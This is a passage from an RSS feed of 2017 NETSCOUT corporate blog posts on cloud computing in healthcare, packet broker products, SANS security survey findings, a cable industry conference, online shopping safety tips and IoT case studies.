    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Cloud computing, the Rx for health care</title>
  <link>http://localhost:7996/blog/cloud-computing-rx-health-care</link>
  <description>The cloud enables speed, scale, and resiliency for the healthcare industry. But private, public, hybrid and multi-cloud add additional layers of IT complexity. Therefore, gaining pervasive visibility -- on-premises and off-premises -- is required to speed problem resolution and fuel healthcare innovation. Anything less hampers the efforts of IT professionals as they struggle...</description>
  <content:encoded><![CDATA[<p>The supply chain sits at the center of the health care industry’s ongoing transformation. A recent study by Navigant found that U.S. hospitals could reduce annual supply expenses by approximately $23 billion in aggregate through improvements in supply chain operations, processes and product use. The cloud offers a cost-effective model, along with massive computing power, to support the most innovative supply chain initiatives.</p>

<p>Five years ago, automation in the health care supply chain was simply an emulation of paper processes. It was better than paper, but it didn’t allow the industry to do anything faster, or dramatically different. Since then, the industry has made significant progress emerging from the technological Stone Age to become fully automated. Supply chain transactions that used to take 90 minutes have been reduced to 15 minutes.</p>

<p>That is really just the start. The next step in this automation evolution is just-in-time delivery. True real-time delivery will increase efficiency across the health care supply chain and help providers keep inventory and costs low, while reducing waste. Pushing the supply chain to this next level requires a tremendous amount of computing power that was previously cost-prohibitive for most industry stakeholders.</p>

<p>The cloud changes the paradigm. It enables speed, scale, and resiliency without major capital investments. The cloud allows us to reimagine the supply chain’s potential because we can scale up the architecture and processing power as demand dictates, at a fraction of the cost.</p>

<p>This is important because the health care industry needs an agile, resilient supply chain. As the supply chain moves faster there will be less slack in the system. When transactions took 90 minutes, there was a lot of breathing room to handle system failures caused by issues such as natural disasters or component failures. But in the 15-minute world, we no longer have that luxury. The architectures powering health care supply chains must keep running. One of the negative downstream effects of system failure is canceled medical procedures that result in tarnished reputations, lost revenue and substandard patient care.</p>

<p>The cloud provides phenomenal levels of resiliency that health care manufacturers, distributors and providers can’t achieve on their own. In the cloud, the architecture is distributed across multiple datacenters and components. If one datacenter goes down, the architecture can failover to another datacenter in a matter of minutes – significantly reducing if not eliminating altogether the opportunity for failure.</p>

<p>At GHX, I experienced the cloud’s resilience first hand. In February 2017, Amazon suffered its only outage – ever. That outage, inadvertently caused by one of Amazon’s system administrators, took down three datacenters on the East Coast. My team and I were able to get back up and running using Amazon’s West Coast datacenters in under two hours. In the past, that type of failure could have taken a day or more to rectify and cost an organization millions of dollars. Today, if needed, we can conduct that crossover in a mere 15 minutes with minimal cost to the business.</p>

<p>The cloud offers the health care industry a tremendous opportunity to re-think the way it manages and uses IT resources. The cloud can free the industry from its expensive legacy systems, and enable the industry to use its data in a more transparent, efficient way that will dramatically improve the way it conducts business.</p>

<p>&nbsp;</p>

<p class="nc_attribution_text">This article was written by Steve Cochran from <a href="https://www.infoworld.com/article/3235918/cloud-computing/cloud-computing-the-rx-for-health-care.html" rel="nofollow" target="_blank">InfoWorld</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com" target="_blank">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/cloud-rx-healthcare.jpg" length="547524" type="image/jpeg"/>
    <guid isPermaLink="false">51b1457c-4637-4490-8f77-0430c7cf17f4</guid>
    <pubDate>Tue, 14 Nov 2017 01:30:00 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Rise of Software-driven Packet Broker Solutions</title>
  <link>http://localhost:7996/blog/rise-software-driven-packet-broker-solutions</link>
  <description>By enabling customers to smoothly transition to software-driven packet broker solutions, NETSCOUT has demonstrated visionary excellence with the nGenius® 5000 Series Packet Flow Switch (PFS) and earned Frost &amp; Sullivan’s 2017 Visionary Innovation Leadership Award.</description>
  <content:encoded><![CDATA[<div style="background-color: #F5F5F5;margin: 20px 0 20px;padding: 20px;border: 1px solid #DDDDDD;"><img alt="Jessy Cavazos, Frost &amp; Sullivan" src="http://localhost:7996/sites/default/files/JessyCavazos.jpg" style="float:left;margin-right:15px;max-width:100px;" /><strong><em>Written by Jessy Cavazos</em></strong><br />
Jessy Cavazos, Industry Director for Measurement and Instrumentation is a 15 year veteran of Frost &amp; Sullivan. In her practice, she tracks Test &amp; Measurement (Electronic Test Equipment, Communications Test, Mechanical Test, Analytical Instrumentation, Dimensional Metrology), Semiconductors and Sensors.</div>

<p>By enabling customers to smoothly transition to software-driven packet broker solutions, NETSCOUT has demonstrated visionary excellence with the <a href="https://www.netscout.com/product/ngenius-5000-series-packet-flow-switch">nGenius® 5000 Series Packet Flow Switch (PFS)</a> and earned <a href="https://www.prnewswire.com/news-releases/frost--sullivan-recognizes-netscout-systems-inc-for-its-visionary-leadership-in-packet-broker-solutions-300550054.html?tc=eml_cleartime" target="_blank">Frost &amp; Sullivan’s 2017 Visionary Innovation Leadership Award</a>. This award recognizes companies that deliver highly competitive solutions that transform the way businesses perform daily activities, set new, long-lasting trends in how technologies are deployed, and deliver unique and differentiated benefits that greatly improve business performance.</p>

<p>Frost &amp; Sullivan believes NETSCOUT’s new solutions will have a profound impact on the network packet brokers industry, providing customers with tight budgets the flexibility to purchase the software and run it on any open compute project (OCP) platform, and sustainably scale and manage their packet broker network through software. Organizations can keep up with changing infrastructure needs without having to repeatedly make hardware investments. This revolutionary approach also eliminates hours wasted looking for components that integrate with proprietary hardware and dependency on vendors’ product roadmaps.</p>

<p>With the nGenius® 5000 Series PFS, NETSCOUT fundamentally changed the architectural framework in the packet broker solutions industry: customers can seamlessly filter, load balance, aggregate, and replicate using a software-driven architecture. The series supports high density deployments running on OCP network switches. Customers can also use the software with the <a href="https://www.netscout.com/product/ngenius-6000-series-packet-flow-switch">nGenius 6000 Series PFS</a> to easily scale and perform advanced processing.</p>

<p>Most suppliers sell either test access points (TAPs), monitoring tools, or just packet broker software making problem source identification time-consuming and end-to-end visibility impossible. New entrants have aspired to address this unmet need with software-driven solutions but they feature a complex-to-operate controller framework. In contrast, NETSCOUT has adopted a controller-less architecture and is the only packet broker solutions vendor that offers end-to-end network and application performance monitoring solutions. Through integration into the NETSCOUT <a href="https://www.netscout.com/product/ngeniusone">nGeniusONE</a> dashboard, customers can monitor the health of their entire visibility framework.</p>

<p>With support also a major concern, NETSCOUT developed a continuum of price-performance points for customers to choose from. The most innovative model is the commercial off-the-shelf (COTS) NETSCOUT Certified COTS model that enables customers to acquire hardware that bundles NETSCOUT PFOS software directly from select resellers in the OCP ecosystem and receive support from NETSCOUT for both hardware and software. Alternatively, customers can opt for the NETSCOUT Qualified COTS model and receive support from each vendor, or the Appliance model with support for the whole solution from NETSCOUT.</p>

<p>With the nGenius 5000 Series PFS, NETSCOUT scores high in the packet broker solutions market by addressing the industry shift to disaggregated hardware and software functionality. Despite increasing network complexity, customers are able to scale their infrastructure cost-effectively and even leverage existing hardware. NETSCOUT’s low dependence on hardware has positioned it well to bring to market drastically different solutions to customers. Recently, NETSCOUT also introduced Packet Flow eXtender (PFX) software, running over X86 platforms, for advanced packet processing, plus PFS Fabric Manager to simplify packet broker lifecycle management. NETSCOUT continues to demonstrate commitment to support customers in their efforts to address ever-changing infrastructure requirements, smoothly scale their networks, and replicate them on demand—all in a cost-efficient manner.</p>

<p align="center" style="text-align:center"><b>Network Packet Broker Solutions Market: Decision Support Matrix for Visionary Innovation, Global, 2017</b></p>
<img alt="Decision Support Matrix " data-entity-type="file" data-entity-uuid="ecab0a19-8d28-4561-8494-adbf0ff59981" src="http://localhost:7996/sites/default/files/inline-images/matrix.JPG" class="align-center" /><p><strong> </strong><strong> </strong></p>

<p>For insights into industry challenges and NETSCOUT’s competitive differentiators, read <a href="https://www.netscout.com/pfs/download/frost-sullivan-innovation-award">Frost &amp; Sullivan’s Best Practices Research on the packet broker solutions industry</a>.</p>

<p><em>~Jessy Cavazos, Industry Director for Measurement and Instrumentation, Frost &amp; Sullivan.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/packet_flow_switch.jpg" length="170117" type="image/jpeg"/>
    <guid isPermaLink="false">c7acef57-9bfb-44e2-8d08-32b206475253</guid>
    <pubDate>Wed, 08 Nov 2017 15:00:00 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Can Network and Security Operations be Friends?</title>
  <link>http://localhost:7996/blog/can-network-and-security-operations-be-friends</link>
  <description>This blog post is the third in a series that examines the results of a recent network security infrastructure survey conducted by SANS Institute[1]. It highlights key takeaways for network and security operations professionals to consider. Despite advances in cybersecurity and application performance management, today’s enterprises continue to be challenged with achieving full...</description>
  <content:encoded><![CDATA[<p><em>This blog post is the third in a series that examines the results of a&nbsp;</em><a href="http://enterprise.netscout.com/pfs/SANS-Network-Security-Research"><em>recent network security infrastructure survey conducted by SANS Institute</em></a><a name="_ednref1"></a><a href="https://www.netscout.com/blog-post/performance-vs-security-two-ways-have-both#_edn1"><strong><em><sup>[1]</sup></em></strong></a><em>. It highlights key takeaways for network and security operations professionals to consider.</em><em>&nbsp;</em></p>
<p>Despite advances in cybersecurity and application performance management, today&rsquo;s enterprises continue to be challenged with achieving full visibility into the network interdependencies, preventing effective performance triage and threat mitigation. For example, in the latest SANS survey, <a href="http://enterprise.netscout.com/pfs/SANS-Network-Security-Research"><em>Network Security Infrastructure and Best Practices (2017)</em></a>, only 31% of respondents had achieved a completely centralized security architecture to manage and secure their networks. This means that security analysis must often be performed remotely, potentially resulting in an impact on network and application performance. Network downtime or reduced performance of business applications is not that the network ops want to hear about!</p>
<p>The throughput of security tools, which are engaged in processing-intensive tasks, often lag behind the network infrastructure. The bulk of security systems&mdash;more than 50%, according to the same SANS report&mdash;operate at 1G to 10G, lagging behind the speeds of core networks in the data centers that are transitioning to 10G, 40G and even 100G. Rip-and-replace is not an option for these often-costly systems, while security tools operating at 40G / 100G speeds may not be available at all. Thus, any upgrades in the data center must take into account the impact on the security ops.</p>
<p>Compounding the issues, separation of duties creates silos of visibility. Security ops may not see all the traffic that would help them identify and combat threats, while network ops are understandably concerned about the rollouts of new security systems creating performance impact. Can shared visibility bring the two teams together?</p>
<p>SANS recommends that security and network operations teams coordinate with each other to make sure that the security and performance monitoring priorities align. Questions that you might want to consider jointly include:</p>
<ul>
<li>Is bandwidth adequate at times of highest demand?</li>
<li>Do security systems contribute to creating choke points?</li>
<li>Do you have silos of visibility into network traffic?</li>
<li>Can you detect malicious behaviors at all times?</li>
<li>Do you have plans to logically separate your production network from your monitoring infrastructure?</li>
</ul>
<p>Organizations need to take a more resource-efficient, performance-friendly approach to network and security monitoring that complement the more traditional methods and architectures in modern distributed environments. Improved cross-visibility can streamline operations for&nbsp;<em>both</em>&nbsp;NOCs and SOCs, helping you drive operational efficiency and achieve shared goals of performance and security. <a href="http://enterprise.netscout.com/pfs/SANS-Network-Security-Research">Download the full SANS report</a> to learn more.</p>]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/network_ops.jpg" length="243538" type="image/jpeg"/>
    <guid isPermaLink="false">43624894-6119-40b9-a5eb-b9ae7da8b09c</guid>
    <pubDate>Wed, 08 Nov 2017 12:14:14 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Three key observations from SCTE Cable-Tec 2017</title>
  <link>http://localhost:7996/blog/three-key-observations-scte-cable-tec-2017</link>
  <description>With SCTE Cable-Tec 2017 in the rear view mirror, the bags unpacked, and the expense reports filed, it seems like a good time to sit down and pen some reflections from the event. Afterall, when over 10,000 cable professionals converge for a conference, one is bound to walk away with some distinct impressions. To start, if there was one, the overarching impression would be that...</description>
  <content:encoded><![CDATA[<p>With SCTE Cable-Tec 2017 in the rear view mirror, the bags unpacked, and the expense reports filed, it seems like a good time to sit down and pen some reflections from the event. Afterall, when over 10,000 cable professionals converge for a conference, one is bound to walk away with some distinct impressions.</p>

<p>To start, if there was one, the overarching impression would be that the Cable industry is vibrant! New technologies, services, and opportunities abound. The operators are testing, trialing, and deploying an array of products and services.</p>

<p>That said, there were three key areas where the next big… is taking place.</p>

<p>First, the access network continues to evolve. DOCSIS3.1 is the main driver providing even greater bandwidth to the consumer. But that does not stand alone. WiFi and mobility remain a top growth area for the cable industry. Most recently, the emergence of SD-WAN is an opportunity for operators to grow their presence in the business services market.</p>

<p>Second, the transformation of the cable operators is well underway. What I mean is that the Cable/MSO operators are quickly adopting virtualization and cloudification of their infrastructure to gain economies of scale and increase service flexibility and agility. It was obvious that today’s cable companies are not the same companies they were a generation ago.</p>

<p>Third, there was the ever present concern around cybersecurity. This was both from a DDoS perspective as well as from a threat of malware. &nbsp;As with anyone who runs a network, a security breach remains a clear and present danger. Afterall, the cyber attacker needs to be correct only once, the operator needs to be correct all the time. As broadband network operators, the cable operators are targets of customer impacting cyberattacks.</p>

<p>Personally, I always find it interesting to see how much the cable industry progresses between our annual gatherings at CableTec. While I’m still amazed at the progress, I’m excited by the knowledge that the work we do here at NETSCOUT remains as invaluable and critical to their success as ever. Our portfolio of products provides service visibility, customer behavioral insight, and security that has made many of today’s services successful and will enable the success of tomorrow’s services and architectures. I can’t wait until we meet again in 2018 in Atlanta, Georgia.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/scte_b.jpg" length="128371" type="image/jpeg"/>
    <guid isPermaLink="false">0d954b8d-1778-45b9-8958-79ac96d61563</guid>
    <pubDate>Tue, 07 Nov 2017 13:59:09 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Mike Serrano</dc:creator>
    </item>
<item>
  <title>What is Your Security’s Org Chart?</title>
  <link>http://localhost:7996/blog/what-your-securitys-org-chart</link>
  <description>This blog post is the fourth in a series that examines the results of a recent network security infrastructure survey conducted by SANS Institute[1]. It highlights key takeaways for network and security operations professionals to consider. When viewed as a network schematic, most architectures appear relatively straightforward. But don’t be deceived by this simplicity. Scale...</description>
  <content:encoded><![CDATA[<p><em>This blog post is the fourth in a series that examines the results of a&nbsp;</em><a href="http://enterprise.netscout.com/pfs/SANS-Network-Security-Research"><em>recent network security infrastructure survey conducted by SANS Institute</em></a><a name="_ednref1"></a><a href="https://www.netscout.com/blog-post/performance-vs-security-two-ways-have-both#_edn1"><strong><em><sup>[1]</sup></em></strong></a><em>. It highlights key takeaways for network and security operations professionals to consider.</em><em>&nbsp;</em></p>
<p>When viewed as a network schematic, most architectures appear relatively straightforward. But don&rsquo;t be deceived by this simplicity. Scale, availability and security are at a constant tug of war.&nbsp; It&rsquo;s getting more difficult to separate business processes from network infrastructure; the network is both the driving force and the manifestation of the digital transformation.</p>
<p>Traditional, perimeter-oriented defenses are insufficient in distributed, virtualized and cloud-based environments. Threats may come from within your organization, or &ldquo;incubate&rdquo; until an opportune moment. Incorporating public cloud technologies means that you are no longer fully in control of the underlying physical infrastructure. Your org chart must adapt in line with these trends, including which network security monitoring functions can and should be centralized, and which ones should remain distributed.</p>
<p>Many organizations are following the hybrid approach. In the latest SANS survey, <a href="http://enterprise.netscout.com/pfs/SANS-Network-Security-Research"><em>Network Security Infrastructure and Best Practices (2017)</em></a>, a majority of respondents (64%) described the architecture of their security infrastructure as a combination of centrally managed and locally managed systems. A smaller number (31%) considered their architecture to be totally centralized. Only 5% believed their organization has a totally distributed management structure. This means that security analysis must often be performed remotely, potentially resulting in an impact on network and application performance.&nbsp;</p>
<p>Shared network visibility can drastically improve both security and application performance areas. By working closely with their network operations counterparts, security teams can tap into the full power of packet data that&rsquo;s already being used by service assurance platforms. You cannot secure what you cannot see, and here the network ops often hold the keys. These teams make sure that business applications are up and running at all times; they employ sophisticated tools, often involving packet and flow analysis to investigate and triage performance problems. On the other hand, network ops can benefit by knowing security team&rsquo;s plans in advance. By teaming up and pooling resources, you both can benefit from this wealth of information.</p>
<p>Respondents in the <a href="http://enterprise.netscout.com/pfs/SANS-SOC-survey"><em>2017 SANS SOC Report</em></a> indicated that their SOC operations are sufficiently flexible and adaptable. However, the biggest weakness is the lack of visibility; security teams are unable to detect threats whose signatures are unknown. Many threats have to be investigated manually, sapping resources and creating skill shortages. Lack of automation also means that &ldquo;alert fatigue&rdquo; is frequent and may lead to security features simply being turned off.</p>
<p>Identifying common goals can help your organization to allocate your resources optimally. Consider the following questions:</p>
<ul>
<li>When is the right time bring network and security operations together for a new security rollout?</li>
<li>What role a network visibility architect might play in your organization?</li>
<li>How can improved network packet visibility impact your NOC and SOC?</li>
<li>Will shared visibility improve automation and response times?</li>
</ul>
<p>The distributed network architectures are here to stay. To deal with these environments, a highly efficient SOC is vital. To achieve efficiency, however, it must see everywhere into the network &ndash; whether distributed, remote or centralized. So make friends with your NOC counterparts and see deeper than less foresighted organizations do. <a href="http://enterprise.netscout.com/pfs/SANS-Network-Security-Research">Download the full SANS Network Infrastructure report</a> to learn more. If you are curious about how your SOC colleagues are doing, read the <a href="http://enterprise.netscout.com/pfs/SANS-SOC-survey">SANS SOC report</a>.</p>
<p>&nbsp;&nbsp;</p>]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/securityorg_2.jpg" length="103289" type="image/jpeg"/>
    <guid isPermaLink="false">700739f9-21bf-466b-8861-ed523328b806</guid>
    <pubDate>Mon, 06 Nov 2017 13:28:53 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Safe Shopping Online</title>
  <link>http://localhost:7996/blog/safe-shopping-online</link>
  <description>The holiday season is practically around the corner and everyone wants to be the best gift-giver [even if they won’t admit to it at first]. Mega-sale here, buy-one-get-one-free there – it’s pure madness! I’m not even mentioning the lines still forming at the malls even if stock with greater variety is available online [luckily paired with a more convenient form of signing your...</description>
  <content:encoded><![CDATA[<p>The holiday season is practically around the corner and everyone wants to be the best gift-giver [even if they won’t admit to it at first]. <em>Mega-sale</em> here, <em>buy-one-get-one-free</em> there – it’s pure madness! I’m not even mentioning the lines still forming at the malls even if stock with greater variety is available online [luckily paired with a more convenient form of signing your soul away + $9.95 shipping &amp; handling]. Online shopping has boomed in the past decade and cybercrimes exploiting coveted and impulsive purchases has quadrupled.</p>

<p>Seldom does a month pass by when we don’t hear of a massive exploit shooting the starter gun making petrified users race to find out whether their savings have been compromised. While being extremely convenient, online shopping does come with often-ignored risks and responsibilities not included in the cart subtotal. Fortunately, there are a few precautions users can take to shop and stay safe online:</p>

<p><strong>You are, but is your device ready to shop?</strong></p>

<ul>
	<li>Always keep your PC, Mac or mobile device up to date</li>
	<li>Avoid using public Wi-Fi or public computers when shopping online
	<ul>
		<li>This includes library &amp; airport PCs!</li>
	</ul>
	</li>
	<li>Don't send your credit card details via email &amp; don’t post them on social media
	<ul>
		<li><u>Even if in a private message</u></li>
		<li>Don’t enter them on an unsecured website; a secure website has <a href="https://www.yammer.com/netscout.com/#/uploaded_files/105888822?threadId=959695621">a few indicators</a> which prove its credibility</li>
	</ul>
	</li>
	<li>Turn off Bluetooth if you are not using it, and check what permissions applications are asking for before you install them</li>
	<li>Jailbreaking or rooting your device may open up more features but it can leave it more susceptible to threats</li>
</ul>

<p><strong>Inspect the website:</strong></p>

<ul>
	<li>Research your retailer
	<ul>
		<li>Make sure to fully check out the retailer's credentials if it's not a big name you have heard of before. A quick search of the site name should turn up results and reviews about the service, but keep an eye out for overly positive reviews on user forums that might not be legitimate.</li>
	</ul>
	</li>
	<li>Check for a physical address and contact details like phone numbers, support email for the vendor before buying</li>
	<li>Don't give away more information than you need to
	<ul>
		<li>Retailers generally don't need to know details like your date of birth or social security number, so why disclose it if you don't have to?</li>
	</ul>
	</li>
	<li>Ask yourself: <a href="https://www.yammer.com/netscout.com/#/uploaded_files/105888822?threadId=959695621">Is this website legit?</a></li>
</ul>

<p><strong>For a peace of mind:</strong></p>

<ul>
	<li>Remember to log out of your account after making a purchase
	<ul>
		<li>Especially if using free, public WiFi</li>
	</ul>
	</li>
	<li>Use a payment method with buyer protection
	<ul>
		<li>Although debit cards ensure you are using your own cash to make a purchase, many do not offer the same robust buyer protection as other options if something does go wrong. A credit card, PayPal or a virtual wallet option give you more flexibility when it comes to requesting a chargeback.</li>
	</ul>
	</li>
</ul>

<p>Finally, if you lose your device and it has personal information on it such as credit card info, or you left it logged in to an account which has access to your credit card or bank details, make sure you can remotely wipe and disable your device. For iOS, enable <a href="https://support.apple.com/explore/find-my-iphone-ipad-mac-watch">Find My iPhone</a> from the settings. Android users can use <a href="https://www.google.com/android/devicemanager">Google's Android Device Manager</a> to remotely lock and erase the handset or tablet. Windows Phone owners can use the <a href="https://account.microsoft.com/devices">Find My Phone</a> feature to erase the handset if lost.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/online%20shopping_1.jpg" length="66769" type="image/jpeg"/>
    <guid isPermaLink="false">3ca10a90-d526-4c48-8ce5-d0e8696ac531</guid>
    <pubDate>Tue, 31 Oct 2017 16:04:25 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>IT Security Team</dc:creator>
    </item>
<item>
  <title>10 Internet of Things (IoT) Success Stories by Industry</title>
  <link>http://localhost:7996/blog/10-internet-things-success-stories</link>
  <description>Learn about how different industries are using IoT, including government, energy, agriculture, healthcare and consumer goods.</description>
  <content:encoded><![CDATA[<p>The Internet of Things (IoT) is beginning to have a profound effect on businesses and business models. From government, to utilities, to transport and logistics, IoT is changing industries. Here are organizations from five verticals undergoing transformation because of IoT technologies.</p>

<h2>IoT in Government</h2>

<p>The IoT is <a href="http://www.cio.com/article/3137047/internet-of-things/internet-of-things-poised-to-transform-cities.html" target="_blank">transforming municipal life</a> through a number of smart city initiatives.</p>

<p>"Cities and city leaders are thinking more holistically about different uses of technology that are integrated and bringing different aspects of the city together into a unified whole," says Tim Herbert, senior vice president, research and market intelligence, at nonprofit trade association CompTIA.</p>

<p>"Improved decision-making made possible through new or better streams of data ranks as the highest perceived benefit," Herbert adds.</p>

<p>A few key examples of smart cities initiatives include the following:</p>

<ul>
	<li><strong>Water management.</strong>&nbsp;The city of Houston was recently losing about 15 billion gallons of water per year (about 15 percent of its water) from leaky pipes. It embedded sensors and intelligent pump control systems, allowing it to better regulate the flow of water and identify issues. Similar smart cities solutions could include: water quality, irrigation, storm water runoff, flooding and household water management.</li>
	<li><strong>Energy conservation.&nbsp;</strong>The New York State Energy Research and Development Authority (NYSERDA) has announced its new Real Time Energy Management (RTEM) program, which uses sensors, smart meters and big data analytics to optimize the energy usage of commercial buildings. New York State and utilities in the region are also working to upgrade the power grid.</li>
	<li><strong>Transportation.</strong>&nbsp;Columbus, Ohio, recent winner of the U.S. Department of Transportation's Smart City Challenge, is using part of its $40 million prize to deploy electric self-driving shuttles operating in conjunction with a new rapid transit center. CompTIA says the system will enable better vehicle-to-vehicle data exchange and communication with traffic signals and other transportation infrastructure.</li>
	<li><strong>Public safety.&nbsp;</strong>Copenhagen, Denmark, has replaced more than half its street lights with energy-efficient smart LED lights. Sensors and connectivity to the city's network enable auto-dimming based on time of day or the presence of a full moon, and the ability to increase brightness when they sense walkers or bikers. Related public safety smart cities projects could include video surveillance systems with advanced analytics, forest fire fighting drones and incident reporting and monitoring systems for citizens.</li>
	<li><strong>Environment.</strong>&nbsp;CITISENSE, a consortium of 14 European nations, is deploying a network of “citizen observatories” to monitor air quality through wearable sensors. CompTIA notes similar crowdsourcing approaches are underway in Beijing and several other cities.</li>
</ul>

<h2>IoT in the Energy Sector</h2>

<p>For decades, energy utilities in the U.S. have followed a common model: big, centralized power plants and high-voltage transmission lines that send power to substations which then distribute that power to homes and businesses. But the <a href="https://www.cio.com/article/3129410/internet-of-things/how-iot-makes-electricity-generation-more-efficient.html" target="_blank">IoT may change the energy utility playbook</a>.</p>

<p>Those big power plants and high-voltage transmission lines are still part of the equation, but so are community solar power, wind farms, microgrids, battery storage and more. Connecting these technologies to the existing grid — handling settlements in an enclosed market, linking up transactions between energy producers and buyers (perhaps via blockchain technology) — requires a serious IT overhaul.</p>

<p>Energy analytics. The New York State Power Authority (NYPA) is the largest state public power organization in the U.S. It operates 16 generating facilities (including two plants powered by Niagara Falls) and more than 1,400 circuit-miles of transmission lines. NYPA is responsible for 15 to 20 percent of New York State's daily electricity output. The organization has connected its energy-producing machines to analytics software via sensors. The software, running in NYPA's central Smart Operations Center in White Plains, N.Y., provides operations leaders with predictive alerts that accurately forecast possible failures up to weeks before they occur.</p>

<p>NYPA has also opened the Albany, N.Y. -based New York Energy Manager (NYEM) network operations center, which will eventually be bi-directionally connected to 20,000 public buildings throughout the state. That will allow it to send controls to building management systems to actively drive energy savings by lowering heating or cooling requirements during periods of low use (like weekends, evenings, breaks in school schedules, etc.). In the future, it could be tied to building occupancy to match the requirements to the heat load associated with the number of people in a building.</p>

<p>Once the buildings are fully online, NYPA estimates NYEM will save taxpayers more than $100 million annually. Eventually, NYPA hopes to offer the services to its business and industrial customers.</p>

<p>"It will take time for the majority of buildings to be connected bi-directionally," says Ken Lee, senior vice president and CIO of NYPA. "We will start with a significant number, but it will take time to connect a large percentage since many of the buildings have legacy systems which don't have building management systems to connect to. This is a capability which we're actively working to mature."</p>

<p>Performance monitoring. The IoT is also transforming electricity generation outside the U.S. <a href="http://www.rasgas.com/" target="_blank">RasGas</a>, a liquefied natural gas (LNG) provider in Qatar, now operates seven LNG trains (an LNG plant's liquefaction and purification facility). With help from GE, RasGas has <a href="https://www.cio.com/article/3044982/internet-of-things/how-ge-will-bring-the-industrial-iot-to-life.html" target="_blank">equipped those trains with sensors that power analytics</a>.</p>

<p>"The trains were identical but weren't performing identically. By monitoring performance with sensors all along the train, we were able to diagnose that the difference came down to some valve settings," says Derek Porter, general manager of Product Management at <a href="https://www.ge.com/digital/" target="_blank">GE Digital</a>. "That saved them the equivalent of three days of energy production — around $8 million."</p>

<h2>IoT in Agriculture</h2>

<p>The agriculture industry is also introducing innovative projects centered on the IoT aimed at improving crop yields, among other goals. Boston, Mass.-based <a href="http://www.freightfarms.com/" target="_blank">Freight Farms</a>, for example, makes <a href="https://www.cio.com/article/3065362/internet-of-things/logmein-creates-cms-like-platform-for-iot-connected-products.html" target="_blank">fully instrumented "farms in a box"</a> built inside 40'x8'x9.5' shipping containers.</p>

<p>"They take shipping containers and they build agricultural units growing leafy greens," says Ryan Lester, director of IoT at LogMeIn's Xively IoT division, provider of the Xively Connected Product Management (CPM) platform used by Freight Farms. "They're operationalizing farming so they can control lighting, watering, pH, so on schedule you can grow herbs and leafy greens and know exactly what the yield will be every week. It's moving farming from 'we hope it rains today' or 'we hope it's sunny' to a fully automated environment that can optimize output."</p>

<p>Freight Farms is also helping users crowdsource recipes based on the data output of the units. For instance, Lester says, the data might show that turning up the humidity setting to a certain point and increasing pH by a certain amount increases the yield of a crop by 10 percent. That data can then help other users increase their yields.</p>

<h2>IoT in Healthcare</h2>

<p>The IoT is transforming business models in healthcare as well. Aerocrine is a Swedish medical device company that makes devices that help doctors diagnose and treat asthma. Aerocrine's NIOX MINO and NIOX VERO are essentially like the breathalyzers police use to measure blood alcohol content, but these devices measure fractional exhaled nitric oxide (FeNO), an important biomarker for airway inflammation. Not only can precise measurement of FeNO in a patient's bloodstream help clinicians determine whether asthma is the cause of a patient's symptoms, the measurement can also be used to determine the likelihood of steroid responsiveness.</p>

<p>Aerocrine is now using Microsoft Azure Cloud Services to gather telemetry data from computers connected to NIOX MINO devices and then transmit the data for analysis. It developed an application that transmits complex data like sensor and environmental data from each instrument's sensor, the serial number of devices and sensors, and the number of airflow measurements remaining on each instrument. Azure Event Hubs ingest the data from the devices, while Azure Stream Analytics processes the data, which is presented to Aerocrine's sales and customer service representatives via Microsoft Power BI for Office 365 dashboards.</p>

<p>Aerocrine is also cross-referencing the data with its Microsoft Dynamics NAV ERP system to give its sales team a clearer view of the devices.</p>

<p>"We needed to analyze that data to manage the supply chain better," says Anders Murman, CTO at Aerocrine. "For example, each device contains a sensor, which eventually reaches zero measurements as hospitals and clinics consume the tests. The facility then approaches us for a new device. But we wanted to be more proactive about this, so we would be able to know how and when to deploy resources in the field."</p>

<p>The data allows the company to determine whether devices are operating outside their normal parameters — in conditions with humidity levels that are too high or too low — and create alerts to send to the customer service team. The company is using insights from the data to <a href="https://www.cio.com/article/2852000/healthcare/internet-of-things-helps-asthma-patients-breathe-easily.html" target="_blank">better identify the trigger points that affect performance</a> and use that information to deploy field resources for customer service and sales support.</p>

<h2>IoT and Consumer Packaged Goods</h2>

<p>The consumer packaged goods (CPG) sector has also experienced success implementing solutions based on the IoT. British beverage company <a href="http://www.diageo.com/en-row/Pages/default.aspx" target="_blank">Diageo</a>, the company behind Johnnie Walker scotch whisky, has begun using <a href="https://www.cio.com/article/2926218/innovation/why-johnnie-walker-joined-the-internet-of-things.html" target="_blank">"smart bottles" for its flagship Johnnie Walker Blue Label whisky</a>.</p>

